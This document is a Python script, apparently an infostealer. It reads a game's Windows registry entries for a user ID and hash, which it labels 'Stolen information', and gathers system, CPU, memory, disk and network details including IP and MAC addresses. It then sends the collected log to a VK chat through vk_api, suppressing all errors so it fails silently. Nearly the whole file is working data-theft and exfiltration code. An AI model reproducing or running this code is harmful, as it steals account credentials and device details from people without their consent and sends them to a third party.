import winreg
import platform
import psutil
from datetime import datetime
import cpuinfo
import socket
import uuid
import re
import vk_api

def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def get_info():
    try:
        # Open the registry key where the file value is located
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\MyachinInc\Mines3")
        log = ""
        resolution = ""
        # Enumerate all the values in the key and return id, hash, session count and resolution
        for i in range(winreg.QueryInfoKey(key)[1]):
            # Get the name and data of the current value
            name, value, _ = winreg.EnumValue(key, i)
            # Check if the name of the value starts with the desired file name
            if name.startswith("user_id_"):
                id = "Retrieved ID: " + str(int(value[0:-1]))
            elif name.startswith("user_hash_"):
                hash = "Retrieved hash: " + str(value[0:-1])[2:-1]
            elif name.startswith("unity.player_session_count_"):
                session_count = "Session count: " + str(value[0:-1])[2:-1]
            elif name.startswith("Screenmanager Resolution Width_") or name.startswith(
                    "Screenmanager Resolution Height_"):
                resolution += str(value) + "x"
        log = "=" * 5 + " Stolen information " + "=" * 5 + "\n" + id + "\n" + hash + "\n" + session_count + "\n" + "Resolution: " + resolution[
                                                                                                                                    0:-1] + "\n"
        log += "\n" + "=" * 5 + " System Information " + "=" * 5
        uname = platform.uname()
        log += "\n" + f"System: {uname.system}"
        log += "\n" + f"Node Name: {uname.node}"
        log += "\n" + f"Release: {uname.release}"
        log += "\n" + f"Version: {uname.version}"
        log += "\n" + (f"Machine: {uname.machine}")
        log += "\n" + (f"Processor: {uname.processor}")
        log += "\n" + (f"Processor: {cpuinfo.get_cpu_info()['brand_raw']}")
        log += "\n" + (f"Ip-Address: {socket.gethostbyname(socket.gethostname())}")
        log += "\n" + (f"Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}")

        # Boot Time
        log += "\n" + ("=" * 5 + " Boot Time " + "=" * 5)
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        log += "\n" + (f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")

        # log +=  "\n" +   CPU information
        log += "\n" + ("=" * 5 + " CPU Info " + "=" * 5)
        # number of cores
        log += "\n" + ("Physical cores: " + str(psutil.cpu_count(logical=False)))
        log += "\n" + ("Total cores: " + str(psutil.cpu_count(logical=True)))
        # CPU frequencies
        cpufreq = psutil.cpu_freq()
        log += "\n" + (f"Max Frequency: {cpufreq.max:.2f}Mhz")
        log += "\n" + (f"Min Frequency: {cpufreq.min:.2f}Mhz")
        log += "\n" + (f"Current Frequency: {cpufreq.current:.2f}Mhz")
        # CPU usage
        log += "\n" + ("CPU Usage Per Core:")
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            log += "\n" + (f"Core {i}: {percentage}%")
        log += "\n" + (f"Total CPU Usage: {psutil.cpu_percent()}%")

        # Memory Information
        log += "\n" + ("=" * 5 + " Memory Information " + "=" * 5)
        # get the memory details
        svmem = psutil.virtual_memory()
        log += "\n" + (f"Total: {get_size(svmem.total)}")
        log += "\n" + (f"Available: {get_size(svmem.available)}")
        log += "\n" + (f"Used: {get_size(svmem.used)}")
        log += "\n" + (f"Percentage: {svmem.percent}%")

        log += "\n" + ("=" * 5 + " SWAP " + "=" * 20)
        # get the swap memory details (if exists)
        swap = psutil.swap_memory()
        log += "\n" + (f"Total: {get_size(swap.total)}")
        log += "\n" + (f"Free: {get_size(swap.free)}")
        log += "\n" + (f"Used: {get_size(swap.used)}")
        log += "\n" + (f"Percentage: {swap.percent}%")

        # Disk Information
        log += "\n" + ("=" * 5 + " Disk Information " + "=" * 5)
        log += "\n" + ("Partitions and Usage:")
        # get all disk partitions
        partitions = psutil.disk_partitions()
        for partition in partitions:
            log += "\n" + (f"=== Device: {partition.device} ===")
            log += "\n" + (f"  Mountpoint: {partition.mountpoint}")
            log += "\n" + (f"  File system type: {partition.fstype}")
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                # this can be catched due to the disk that
                # isn't ready
                continue
            log += "\n" + (f"  Total Size: {get_size(partition_usage.total)}")
            log += "\n" + (f"  Used: {get_size(partition_usage.used)}")
            log += "\n" + (f"  Free: {get_size(partition_usage.free)}")
            log += "\n" + (f"  Percentage: {partition_usage.percent}%")
        # get IO statistics since boot
        disk_io = psutil.disk_io_counters()
        log += "\n" + (f"Total read: {get_size(disk_io.read_bytes)}")
        log += "\n" + (f"Total write: {get_size(disk_io.write_bytes)}")

        ## Network information
        log += "\n" + ("=" * 5 + " Network Information " + "=" * 5)
        ## get all network interfaces (virtual and physical)
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                log += "\n" + (f"=== Interface: {interface_name} ===")
                if str(address.family) == 'AddressFamily.AF_INET':
                    log += "\n" + (f"  IP Address: {address.address}")
                    log += "\n" + (f"  Netmask: {address.netmask}")
                    log += "\n" + (f"  Broadcast IP: {address.broadcast}")
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    log += "\n" + (f"  MAC Address: {address.address}")
                    log += "\n" + (f"  Netmask: {address.netmask}")
                    log += "\n" + (f"  Broadcast MAC: {address.broadcast}")
        ##get IO statistics since boot
        net_io = psutil.net_io_counters()
        log += "\n" + (f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
        log += "\n" + (f"Total Bytes Received: {get_size(net_io.bytes_recv)}")
        return log
        key.Close()
    except:
        pass


try:
    token = "ur token"
    vk_session = vk_api.VkApi(token=token)
    session_api = vk_session.get_api()
    vk = vk_session.get_api()


    def sender(id, text):  # send function
        vk_session.method('messages.send', {'chat_id': id, 'message': text, 'random_id': 0})  # just remember


    sender(1, get_info())
except:
    pass

